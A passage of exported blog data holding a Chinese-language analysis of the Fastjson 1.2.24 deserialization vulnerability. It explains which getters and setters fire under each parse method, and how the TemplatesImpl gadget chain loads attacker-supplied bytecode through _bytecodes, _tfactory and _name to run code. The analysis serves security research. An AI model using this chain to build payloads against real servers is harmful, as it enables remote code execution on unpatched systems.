getOutputProperties()方法中调用了newTransformer()\n\ngetOutputProperties()方法为_outputProperties成员变量的getter方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/26c8c8cf214c6def1efa536683527acf.png)\n\n细心的读者可能会发现，成员变量_outputProperties与其getter方法getOutputProperties()方法名字并不完全一致，多了一个下划线，fastjson是如何将其对应的呢？实际上，fastjson在解析的时候调用了一个smartMatch() 方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6864c0cd6b84a6dbcf73d21ba3803c9c.png)\n\n在寻找_outputProperties的getter方法时，程序将下划线置空，从而产生了成员变量_outputProperties与getter方法getOutputProperties()对应的形式\n\nFastJson与TemplatesImpl的有趣结合\n---------------------------------\n\n首先说TemplatesImpl类。经过上文分析可发现：TemplatesImpl中存在一个反序列化利用链，在反序列化过程中，如果该类的getOutputProperties()方法被调用，即可成功触发代码执行漏洞。\n\n再来分析下FastJson：经过上文对FastJson三种不同途径处理JSON字符串时关于getter方法被调用的条件来看，TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。无论通过fastjson哪种方式解析json字符串，都会触发getOutputProperties()方法。\n\n二者放在一起一拍即合：FastJson在反序列化TemplatesImpl类时会恰好触发TemplatesImpl类的getOutputProperties()方法；TemplatesImpl类的getOutputProperties()方法被触发就会引起反序列化代码执行漏洞。所以说这个漏洞利用很是巧妙。\n\n总结\n----\n\n针对Fastjson 1.2.24反序列化漏洞的利用方式有很多，本文由于篇幅有限仅对比较巧妙的TemplatesImpl攻击调用链路进行举例。后续将会对Fastjson历史漏洞进行详细的分析，希望大家喜欢。","source":"_posts/fastjson1-2-24.md","raw":"---\ntitle: Fastjson 1.2.24反序列化漏洞深度分析\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Hippopx(1).jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\ndate: 2020-07-17 11:05:38\n---\n\n Fastjson 1.2.24反序列化漏洞深度分析\n====================================\n\n前言\n----\n\nFastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。近几年来fastjson漏洞层出不穷，本文将会谈谈近几年来fastjson RCE漏洞的源头：17年fastjson爆出的1.2.24反序列化漏洞。以这个漏洞为基础，详细分析fastjson漏洞的一些细节问题。\n\n关于Fastjson 1.2.24反序列化漏洞，自从17年以来已经有很多人分析过了，一些基础内容本文就不再陈述了。此次漏洞简单来说，就是Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时由于没有进行合理检查而导致的\n\n本文将着重分析一下这个漏洞没有被详细介绍过的细节问题，如下：\n\n1.  parseObject(String text) 、parse (String text)、 parseObject(String text, Class\\<T\\> clazz)三个方法从代码层面上来看，究竟有何不同？\n2. 使用TemplatesImpl攻击调用链路构造poc时，为什么一定需要构造_tfactory以及_name字段？\n3. _outputProperties与其getter方法getOutputProperties()方法名字并不完全一致是如何解决的？\n\n除此之外，本文在介绍TemplatesImpl攻击调用链路时，以模拟寻找漏洞利用链的思路，从最终的执行点开始向上寻找入口，模拟还原出挖掘这个TemplatesImpl利用链的完整过程。\n\n漏洞分析\n--------\n\n关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class\\<T\\> clazz)三个方法，我们进行一个测试\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2a482f1a4f410547c0ac9a3b7876dffa.png)\n\nFastJsonTest类中变量以及其setter/getter关系如下表\n\n|        | public String t1 | private int t2 | private Boolean t3 | private Properties t4 | private Properties t5 |\n| ------ | ---------------- | -------------- | ------------------ | --------------------- | --------------------- |\n| setter | 有               | 有             | 无                 | 无                    | 有                    |\n| getter | 有               | 有             | 有                 | 有                    | 有                    |\n\n接下来，我们分别使用下图三种方式分别将JSON字符串反序列化成Java对象\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5968e24e6caa97be9562234c80400e8.png)\n\n1. Object obj = JSON.parse(jsonstr);\n2. Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);\n3. Object obj = JSON.parseObject(jsonstr);\n\n首先我们运行一下Object obj = JSON.parse(jsonstr);这种方式\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d4d30014d4d24a2897bfa65da386fec4.png)\n\n结果：\n\n- setT1() 、setT2() 、getT4() 、setT5() 被调用\n\n- JSON.parse(jsonstr)最终返回FastJsonTest类的对象\n\n接着我们运行下Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/888051938003f40fb97aa91a724e5887.png)\n\n结果：\n\n- 与JSON.parse(jsonstr);这种方式一样setT1() 、setT2() 、getT4() 、setT5() 被调用\n\n- JSON.parse(jsonstr)最终返回FastJsonTest类的对象\n\n最后我们运行下Object obj = JSON.parseObject(jsonstr);\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21c2453ce372bcfc605f96bb97a9fdc4.png)\n\n结果：\n\n- 这次结果与上两次大不相同，FastJsonTest类中的所有getter与setter都被调用\n- JSON.parseObject(jsonstr);返回一个JSONObject对象\n\n通过上文运行结果，不难发现有三个问题\n\n1. 使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？\n2. 使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?\n3. JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?\n\n### 问题一解答\n\n>  使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？\n\n经过调试可以发现，无论使用JSON.parse(jsonstr);或是JSON.parseObject(jsonstr, FastJsonTest.class);方式解析json字符串，程序最终都会调用位于com/alibaba/fastjson/util/JavaBeanInfo.java中的JavaBeanInfo.build()方法来获取并保存目标Java类中的成员变量以及其对应的setter、getter\n\n首先来看下JSON.parse(jsonstr)这种方式，当程序执行到JavaBeanInfo.build()方法时情景如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0c9cd8220940fbcb60fc3bb987a34b15.png)\n\n此时的调用链如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1f5f848eaa7b8c1af2ea4febf61ba3a9.png)\n\n此时传入JavaBeanInfo.build() 方法的参数值如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3bd0543cc0dc52a33e44fca9b345c270.png)\n\n再来看下JSON.parseObject(jsonstr, FastJsonTest.class)这种方式，当程序执行到JavaBeanInfo.build() 方法时情景如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/440177acd687179a1be554c61759897f.png)\n\n此时的调用链如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d05b4a2272ab1219c192345455013b0c.png)\n\n此时传入JavaBeanInfo.build() 方法的参数值如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/80d1735b7c2742cf729ba6729b5e189e.png)\n\n二者执行到JavaBeanInfo.build() 方法时调用链对比如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21ee55654a62cb8f7750458052485dfe.png)\n\n可见二者后面的调用链是完全一样的。二者不同点在于调用JavaBeanInfo.build()\n方法时传入clazz参数的来源不同：\n\n- JSON.parseObject(jsonstr, FastJsonTest.class)在调用JavaBeanInfo.build()方法时传入的clazz参数源于parseObject方法中第二个参数中指定的“FastJsonTest.class”。\n\n- JSON.parse(jsonstr);这种方式调用JavaBeanInfo.build()方法时传入的clazz参数获取于json字符串中\\@type字段的值。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f0c8407956fe7df0df4b42b3199b6e2a.png)\n\n关于JSON.parse(jsonstr);从json字符串中\\@type字段获取clazz参数，具体代码如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2757daa1052b75266d159af6096ed25e.png)\n\n程序通过解析传入的json字符串的\\@type字段值来获取之后传入JavaBeanInfo.build()方法的clazz参数\n\n因此，只要Json字符串的\\@type字段值与JSON.parseObject(jsonstr, FastJsonTest.class);中第二个参数中类名一致，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2d3c790ca89e2d2ed8999c4f170ffe92.png)\n\nJSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)这两种方式执行的过程与结果是完全一致的。二者唯一的区别就是获取clazz参数的途径不同\n\n### 问题二解答\n\n>   使用JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?\n\n这个问题要从JavaBeanInfo.build() 方法中获取答案：\n\n通过上文的分析可以发现，程序会使用JavaBeanInfo.build()方法对传入的json字符串进行解析。在JavaBeanInfo.build()方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter方法及某些特定条件的 getter方法。通过上文的结果可见，目标类中所有的setter方法都可以被调用，但只有getT4()这一个getter被调用，那么到底什么样的getter方法可以满足要求并被加入fieldList数组中呢？\n\n在JavaBeanInfo.build() 方法可见如下代码\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6ba89b567b638379ac0955cf3ee0e318.png)\n\n程序从clazz（目标类对象）中通过getMethods获取本类以及父类或者父接口中所有的公共方法，接着进行循环判断这些方法是否可以加入fieldList中以便后续处理\n\n条件一、方法名需要长于4\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ba4f3c36c37c86019bd3e46a81de0b2.png)\n\n条件二、不是静态方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d63f0488efd86adc06ef29945da02942.png)\n\n条件三、以get字符串开头，且第四个字符需要是大写字母\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b01f974fd81355c9ace3ba5f6222a4d8.png)\n\n条件四、方法不能有参数传入\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/87ac3c7ff9cb6348d836cf02a97a5f7e.png)\n\n条件五、继承自Collection \\|\\| Map \\|\\| AtomicBoolean \\|\\| AtomicInteger \\|\\|\nAtomicLong\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/95ac194ec336d6e610097b3b038b254b.png)\n\n条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1544f565ed123a2f83dff21f3e2bc05f.png)\n\n### 问题三解答\n\n> JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?\n\n通过上文的分析可以发现，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式从执行流程几乎一样，结果也完全相同；然而使用JSON.parseObject(jsonstr)这种方式，执行的结果与返回值却与前两者不同：JSON.parseObject(jsonstr)返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用。\n\n通过阅读源码可以发现JSON.parseObject(String text)实现如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b856db3404b87d708cd00edfbbd9ee30.png)\n\nparseObject(String text)其实就是执行了parse(),随后将返回的Java对象通过JSON.toJSON（）转为JSONObject对象。\n\nJSON.toJSON()方法会将目标类中所有getter方法记录下来，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ce86b2ba9f56c78fdddea1d1e030dedb.png)\n\n随后通过反射依次调用目标类中所有的getter方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a657b27f84e6bbeeb8f70706ba9108fa.png)\n\n完整的调用链如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/c7b24c882c04cc7e6c42a423176985be.png)\n\n总结：\n\n上文例子中，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)可以认为是完全一样的，而parseObject(String text)是在二者的基础上又执行了一次JSON.toJSON()\n\nparse(String text)、parseObject(String text)与parseObject(String text, Class\\<T\\> clazz)目标类Setter\\\\Getter调用情况\n\n|                | parse(String text) | parseObject(String text) | parseObject(String text, Class\\<T\\> clazz) |\n| -------------- | ------------------ | ------------------------ | ------------------------------------------ |\n| Setter调用情况 | 全部               | 全部                     | 全部                                       |\n| Getter调用情况 | 部分               | 全部                     | 部分                                       |\n\n此外，如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数。（在下文中，为TemplatesImpl类中无setter方法的私有变量_tfactory以及_name赋值运用到的就是这个知识点）\n\nTemplatesImpl攻击调用链路\n-------------------------\n\n针对于上文的分析可以发现，无论使用哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法\n\n如果一个类中的Getter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。\n\nTemplatesImpl类恰好满足这个要求：\n\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中存在一个名为_outputPropertiesget的私有变量，其getter方法中存在利用点，这个getter方法恰好满足了调用条件，在JSON字符串被解析时可以调用其在调用FastJson.parseObject()序列化为Java对象时会被调用，下面我们详细说明一下：\n\n首先我们从漏洞点开始，一层层往入口分析：首先看一下TemplatesImpl类中的getTransletInstance方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/dafa5052e153c29eb5d22bb0ff4c69f5.png)\n\n其中455行调用_class[_transletIndex]的newInstance( )方法来实例化对象的操作\n\n我们看一下_class[_transletIndex]是如何获取的，是否可以控制_class与_transletIndex值皆由451行处defineTransletClasses()方法中获取\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ee4112a8a2ea2b7000c82d287fb3201.png)\n\n我们跟入defineTransletClasses()方法中一探究竟\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/62b59f97a0c97819aabac6c2ac1de16a.png)\n\n在defineTransletClasses()方法中，首先在393行判断_bytecodes值是否为空\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/42e45309e4d50cc3bb655dab8a23df91.png)\n\n值得注意的是，_bytecodes变量是TemplatesImpl类的成员变量\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5254995c16eeb34452e0a82cbac85b46.png)\n\n因此_bytecodes变量可以在构造json字符串时传入，在构造poc时属于可控变量 _bytecodes变量非空值时，程序将会继续执行至下图红框处\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6bbe808584d5a8e5d3c7b24d41400b7e.png)\n\n\n此时，需要满足_tfactory变量不为null，否则导致程序异常退出。这就是为什么公开的poc中需要设置设置_tfactory为{}的原因。因为_tfactory为私有变量，且无setter方法，这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值\n\n接下来，程序将会把_bytecodes变量中的值循环取出并通过loader.defineClass处理后赋值给_class[i]\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png)\n\n我们首先来看下loader.defineClass方法是什么\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ec061c3b3c86c1b3a02482df692a8eea.png)\n\n可见，loader.defineClass方法其实就是对ClassLoader.defineClass的重写。defineClass方法可以从传入的字节码转化为Class\n\n回头分析下上述流程\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png)\n\n\\_bytecodes变量非空值时，程序将会把_bytecodes数组中的值循环取出，使用loader.defineClass方法从字节码转化为Class对象，随后后赋值给_class[i]。如果此时的class为main class，_transletIndex变量值则会是此时_bytecodes数组中的下标值.因此当我们构造出_bytecodes:[evilCode]这样的json字符串（evilCode字符串为我们构造的恶意类的字节码）后，程序会将evilCode化为Class对象后赋值给_class[0]\n\n现在回到getTransletInstance()方法中\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/7485cd6227bab22112407edb3fc801c2.png)\n\n此时的_class[_transletIndex]即为我们构造传入的evilCode类.程序通过调用evilCode类的newInstance()方法来实例化对象的操作，这将导致我们构造的evilCode类中的恶意代码被执行.但在此之前，需要在poc构造json字符串时使得成员变量_name不为空，否则程序还未执行到将evilCode类实例化就提前return\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/36340dd97c18b7074c08d30fd9fce4b7.png)\n\n注意：由于私有变量_name没有setter方法，在反序列化时想给这个变量赋值则需要使用Feature.SupportNonPublicField参数。\n\n在分析完存在漏洞的getTransletInstance方法，我们需要找到一条调用链，这条调用链需要在使用fastjson处理json字符串时成功串连到存在漏洞的getTransletInstance方法上。我们继续向上跟踪代码\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a99fa86415c1e44425807b808c4feff6.png)\n\ncom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java中newTransformer()方法中调用了getTransletInstance()。继续向上跟踪\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/873e4c395da9922f4755f03fdb6142e5.png)\n\ncom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java getOutputProperties()方法中调用了newTransformer()\n\ngetOutputProperties()方法为_outputProperties成员变量的getter方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/26c8c8cf214c6def1efa536683527acf.png)\n\n细心的读者可能会发现，成员变量_outputProperties与其getter方法getOutputProperties()方法名字并不完全一致，多了一个下划线，fastjson是如何将其对应的呢？实际上，fastjson在解析的时候调用了一个smartMatch() 方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6864c0cd6b84a6dbcf73d21ba3803c9c.png)\n\n在寻找_outputProperties的getter方法时，程序将下划线置空，从而产生了成员变量_outputProperties与getter方法getOutputProperties()对应的形式\n\nFastJson与TemplatesImpl的有趣结合\n---------------------------------\n\n首先说TemplatesImpl类。经过上文分析可发现：TemplatesImpl中存在一个反序列化利用链，在反序列化过程中，如果该类的getOutputProperties()方法被调用，即可成功触发代码执行漏洞。\n\n再来分析下FastJson：经过上文对FastJson三种不同途径处理JSON字符串时关于getter方法被调用的条件来看，TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。无论通过fastjson哪种方式解析json字符串，都会触发getOutputProperties()方法。\n\n二者放在一起一拍即合：FastJson在反序列化TemplatesImpl类时会恰好触发TemplatesImpl类的getOutputProperties()方法；TemplatesImpl类的getOutputProperties()方法被触发就会引起反序列化代码执行漏洞。所以说这个漏洞利用很是巧妙。\n\n总结\n----\n\n针对Fastjson 1.2.24反序列化漏洞的利用方式有很多，本文由于篇幅有限仅对比较巧妙的TemplatesImpl攻击调用链路进行举例。后续将会对Fastjson历史漏洞进行详细的分析，希望大家喜欢。","slug":"fastjson1-2-24","published":1,"updated":"2020-09-15T07:55:54.063Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckgrozual006iwsa9627q0p8l","content":"<h1 id=\"Fastjson-1-2-24反序列化漏洞深度分析\"><a href=\"#Fastjson-1-2-24反序列化漏洞深度分析\" class=\"headerlink\" title=\" Fastjson 1.2.24反序列化漏洞深度分析\"></a> Fastjson 1.2.24反序列化漏洞深度分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。近几年来fastjson漏洞层出不穷，本文将会谈谈近几年来fastjson RCE漏洞的源头：17年fastjson爆出的1.2.24反序列化漏洞。以这个漏洞为基础，详细分析fastjson漏洞的一些细节问题。</p>\n<p>关于Fastjson 1.2.24反序列化漏洞，自从17年以来已经有很多人分析过了，一些基础内容本文就不再陈述了。此次漏洞简单来说，就是Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时由于没有进行合理检查而导致的</p>\n<p>本文将着重分析一下这个漏洞没有被详细介绍过的细节问题，如下：</p>\n<ol>\n<li>parseObject(String text) 、parse (String text)、 parseObject(String text, Class&lt;T&gt; clazz)三个方法从代码层面上来看，究竟有何不同？</li>\n<li>使用TemplatesImpl攻击调用链路构造poc时，为什么一定需要构造_tfactory以及_name字段？</li>\n<li>_outputProperties与其getter方法getOutputProperties()方法名字并不完全一致是如何解决的？</li>\n</ol>\n<p>除此之外，本文在介绍TemplatesImpl攻击调用链路时，以模拟寻找漏洞利用链的思路，从最终的执行点开始向上寻找入口，模拟还原出挖掘这个TemplatesImpl利用链的完整过程。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class&lt;T&gt; clazz)三个方法，我们进行一个测试</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2a482f1a4f410547c0ac9a3b7876dffa.png\"></p>\n<p>FastJsonTest类中变量以及其setter/getter关系如下表</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>public String t1</th>\n<th>private int t2</th>\n<th>private Boolean t3</th>\n<th>private Properties t4</th>\n<th>private Properties t5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>setter</td>\n<td>有</td>\n<td>有</td>\n<td>无</td>\n<td>无</td>\n<td>有</td>\n</tr>\n<tr>\n<td>getter</td>\n<td>有</td>\n<td>有</td>\n<td>有</td>\n<td>有</td>\n<td>有</td>\n</tr>\n</tbody></table>\n<p>接下来，我们分别使用下图三种方式分别将JSON字符串反序列化成Java对象</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5968e24e6caa97be9562234c80400e8.png\"></p>\n<ol>\n<li>Object obj = JSON.parse(jsonstr);</li>\n<li>Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);</li>\n<li>Object obj = JSON.parseObject(jsonstr);</li>\n</ol>\n<p>首先我们运行一下Object obj = JSON.parse(jsonstr);这种方式</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d4d30014d4d24a2897bfa65da386fec4.png\"></p>\n<p>结果：</p>\n<ul>\n<li><p>setT1() 、setT2() 、getT4() 、setT5() 被调用</p>\n</li>\n<li><p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p>\n</li>\n</ul>\n<p>接着我们运行下Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/888051938003f40fb97aa91a724e5887.png\"></p>\n<p>结果：</p>\n<ul>\n<li><p>与JSON.parse(jsonstr);这种方式一样setT1() 、setT2() 、getT4() 、setT5() 被调用</p>\n</li>\n<li><p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p>\n</li>\n</ul>\n<p>最后我们运行下Object obj = JSON.parseObject(jsonstr);</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21c2453ce372bcfc605f96bb97a9fdc4.png\"></p>\n<p>结果：</p>\n<ul>\n<li>这次结果与上两次大不相同，FastJsonTest类中的所有getter与setter都被调用</li>\n<li>JSON.parseObject(jsonstr);返回一个JSONObject对象</li>\n</ul>\n<p>通过上文运行结果，不难发现有三个问题</p>\n<ol>\n<li>使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？</li>\n<li>使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?</li>\n<li>JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?</li>\n</ol>\n<h3 id=\"问题一解答\"><a href=\"#问题一解答\" class=\"headerlink\" title=\"问题一解答\"></a>问题一解答</h3><blockquote>\n<p> 使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？</p>\n</blockquote>\n<p>经过调试可以发现，无论使用JSON.parse(jsonstr);或是JSON.parseObject(jsonstr, FastJsonTest.class);方式解析json字符串，程序最终都会调用位于com/alibaba/fastjson/util/JavaBeanInfo.java中的JavaBeanInfo.build()方法来获取并保存目标Java类中的成员变量以及其对应的setter、getter</p>\n<p>首先来看下JSON.parse(jsonstr)这种方式，当程序执行到JavaBeanInfo.build()方法时情景如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0c9cd8220940fbcb60fc3bb987a34b15.png\"></p>\n<p>此时的调用链如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1f5f848eaa7b8c1af2ea4febf61ba3a9.png\"></p>\n<p>此时传入JavaBeanInfo.build() 方法的参数值如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3bd0543cc0dc52a33e44fca9b345c270.png\"></p>\n<p>再来看下JSON.parseObject(jsonstr, FastJsonTest.class)这种方式，当程序执行到JavaBeanInfo.build() 方法时情景如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/440177acd687179a1be554c61759897f.png\"></p>\n<p>此时的调用链如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d05b4a2272ab1219c192345455013b0c.png\"></p>\n<p>此时传入JavaBeanInfo.build() 方法的参数值如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/80d1735b7c2742cf729ba6729b5e189e.png\"></p>\n<p>二者执行到JavaBeanInfo.build() 方法时调用链对比如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21ee55654a62cb8f7750458052485dfe.png\"></p>\n<p>可见二者后面的调用链是完全一样的。二者不同点在于调用JavaBeanInfo.build()<br>方法时传入clazz参数的来源不同：</p>\n<ul>\n<li><p>JSON.parseObject(jsonstr, FastJsonTest.class)在调用JavaBeanInfo.build()方法时传入的clazz参数源于parseObject方法中第二个参数中指定的“FastJsonTest.class”。</p>\n</li>\n<li><p>JSON.parse(jsonstr);这种方式调用JavaBeanInfo.build()方法时传入的clazz参数获取于json字符串中@type字段的值。</p>\n</li>\n</ul>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f0c8407956fe7df0df4b42b3199b6e2a.png\"></p>\n<p>关于JSON.parse(jsonstr);从json字符串中@type字段获取clazz参数，具体代码如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2757daa1052b75266d159af6096ed25e.png\"></p>\n<p>程序通过解析传入的json字符串的@type字段值来获取之后传入JavaBeanInfo.build()方法的clazz参数</p>\n<p>因此，只要Json字符串的@type字段值与JSON.parseObject(jsonstr, FastJsonTest.class);中第二个参数中类名一致，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2d3c790ca89e2d2ed8999c4f170ffe92.png\"></p>\n<p>JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)这两种方式执行的过程与结果是完全一致的。二者唯一的区别就是获取clazz参数的途径不同</p>\n<h3 id=\"问题二解答\"><a href=\"#问题二解答\" class=\"headerlink\" title=\"问题二解答\"></a>问题二解答</h3><blockquote>\n<p>  使用JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?</p>\n</blockquote>\n<p>这个问题要从JavaBeanInfo.build() 方法中获取答案：</p>\n<p>通过上文的分析可以发现，程序会使用JavaBeanInfo.build()方法对传入的json字符串进行解析。在JavaBeanInfo.build()方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter方法及某些特定条件的 getter方法。通过上文的结果可见，目标类中所有的setter方法都可以被调用，但只有getT4()这一个getter被调用，那么到底什么样的getter方法可以满足要求并被加入fieldList数组中呢？</p>\n<p>在JavaBeanInfo.build() 